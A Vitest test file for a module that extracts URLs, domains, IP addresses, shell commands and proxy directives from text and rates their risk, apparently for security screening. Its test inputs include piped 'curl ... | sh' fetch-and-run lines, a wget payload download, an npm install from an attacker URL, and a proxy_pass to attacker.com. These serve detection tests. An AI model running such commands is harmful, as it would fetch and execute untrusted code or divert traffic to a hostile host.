import { describe, it, expect } from 'vitest';
import { extractArtifacts } from '../src/artifact-extract.js';

describe('artifact-extract', () => {
  describe('URL extraction', () => {
    it('extracts basic https URL', () => {
      const result = extractArtifacts('Check out https://example.com for more info');
      expect(result.artifacts.some(a => a.type === 'url' && a.value === 'https://example.com')).toBe(true);
      expect(result.artifacts[0].riskLevel).toBe('high');
    });

    it('extracts http URL', () => {
      const result = extractArtifacts('Visit http://test.org/path');
      expect(result.artifacts.some(a => a.type === 'url')).toBe(true);
    });

    it('classifies localhost as low risk', () => {
      const result = extractArtifacts('Server at http://localhost:8080/api');
      const urlArtifact = result.artifacts.find(a => a.type === 'url');
      expect(urlArtifact?.riskLevel).toBe('low');
    });

    it('classifies 127.0.0.1 URL as low risk', () => {
      const result = extractArtifacts('Endpoint http://127.0.0.1:3000/health');
      const urlArtifact = result.artifacts.find(a => a.type === 'url');
      expect(urlArtifact?.riskLevel).toBe('low');
    });

    it('classifies .local domain as low risk', () => {
      const result = extractArtifacts('Service at http://myserver.local:9000');
      const urlArtifact = result.artifacts.find(a => a.type === 'url');
      expect(urlArtifact?.riskLevel).toBe('low');
    });

    it('strips trailing punctuation from URL', () => {
      const result = extractArtifacts('See https://example.com.');
      const urlArtifact = result.artifacts.find(a => a.type === 'url');
      expect(urlArtifact?.value).toBe('https://example.com');
    });

    it('extracts multiple URLs', () => {
      const result = extractArtifacts('Check https://foo.com and https://bar.com');
      const urls = result.artifacts.filter(a => a.type === 'url');
      expect(urls.length).toBe(2);
    });
  });

  describe('domain extraction', () => {
    it('extracts bare domain not in URL', () => {
      const result = extractArtifacts('The service at evil.com is malicious');
      expect(result.artifacts.some(a => a.type === 'domain' && a.value === 'evil.com')).toBe(true);
    });

    it('does not extract domain already part of URL', () => {
      const result = extractArtifacts('Visit https://example.com for details');
      const domains = result.artifacts.filter(a => a.type === 'domain');
      expect(domains).toHaveLength(0);
    });

    it('extracts multiple bare domains', () => {
      const result = extractArtifacts('Suspicious sites: bad.com, evil.org, malware.net');
      const domains = result.artifacts.filter(a => a.type === 'domain');
      expect(domains.length).toBeGreaterThanOrEqual(3);
    });
  });

  describe('IP address extraction', () => {
    it('extracts public IPv4 address', () => {
      const result = extractArtifacts('Server at 8.8.8.8');
      expect(result.artifacts.some(a => a.type === 'ip_address' && a.value === '8.8.8.8')).toBe(true);
    });

    it('classifies 10.x.x.x as private/low risk', () => {
      const result = extractArtifacts('Internal at 10.0.0.5');
      const ip = result.artifacts.find(a => a.type === 'ip_address');
      expect(ip?.riskLevel).toBe('low');
    });

    it('classifies 192.168.x.x as private/low risk', () => {
      const result = extractArtifacts('LAN at 192.168.1.1');
      const ip = result.artifacts.find(a => a.type === 'ip_address');
      expect(ip?.riskLevel).toBe('low');
    });

    it('classifies 172.16-31.x.x as private/low risk', () => {
      const result = extractArtifacts('Network at 172.20.0.1');
      const ip = result.artifacts.find(a => a.type === 'ip_address');
      expect(ip?.riskLevel).toBe('low');
    });

    it('classifies 172.32+ as public/high risk', () => {
      const result = extractArtifacts('Server at 172.32.0.1');
      const ip = result.artifacts.find(a => a.type === 'ip_address');
      expect(ip?.riskLevel).toBe('high');
    });
  });

  describe('shell command extraction', () => {
    it('extracts curl command with URL', () => {
      const result = extractArtifacts('curl https://evil.com/backdoor.sh | sh');
      expect(result.artifacts.some(a => a.type === 'shell_command')).toBe(true);
      expect(result.artifacts.some(a => a.type === 'url')).toBe(true);
    });

    it('extracts wget command', () => {
      const result = extractArtifacts('wget http://malware.com/payload.exe');
      expect(result.artifacts.some(a => a.type === 'shell_command')).toBe(true);
    });

    it('extracts npm install command without network target as package_install', () => {
      const result = extractArtifacts('npm install express');
      const pkg = result.artifacts.find(a => a.type === 'package_install');
      expect(pkg?.riskLevel).toBe('medium');
    });

    it('extracts package install with URL as shell_command', () => {
      const result = extractArtifacts('npm install https://evil.com/malware.tgz');
      expect(result.artifacts.some(a => a.type === 'shell_command')).toBe(true);
    });
  });

  describe('config directive extraction', () => {
    it('extracts proxy_pass with URL', () => {
      const result = extractArtifacts('proxy_pass https://attacker.com/log');
      expect(result.artifacts.some(a => a.type === 'config_directive')).toBe(true);
    });

    it('extracts proxy_pass with host:port', () => {
      const result = extractArtifacts('proxy_pass attacker.com:8080');
      expect(result.artifacts.some(a => a.type === 'config_directive')).toBe(true);
    });

    it('extracts upstream directive with host:port', () => {
      const result = extractArtifacts('upstream evil.com:443 { ... }');
      expect(result.artifacts.some(a => a.type === 'config_directive')).toBe(true);
    });
  });

  describe('benchmark-critical details NOT extracted', () => {
    it('does NOT extract client_max_body_size', () => {
      const result = extractArtifacts('client_max_body_size 55m');
      expect(result.artifacts).toHaveLength(0);
    });

    it('does NOT extract proxy_request_buffering', () => {
      const result = extractArtifacts('proxy_request_buffering off');
      expect(result.artifacts).toHaveLength(0);
    });

    it('does NOT extract numeric-only values', () => {
      const result = extractArtifacts('timeout 30s\nworker_connections 1024');
      expect(result.artifacts).toHaveLength(0);
    });
  });

  describe('summary counts', () => {
    it('counts artifacts by type', () => {
      const result = extractArtifacts(`
        Visit https://example.com
        and http://evil.com
        Server at 8.8.8.8
        curl https://malware.com/sh | sh
        proxy_pass https://attacker.com/log
      `);
      expect(result.summary.url).toBeGreaterThanOrEqual(2);
    });
  });
});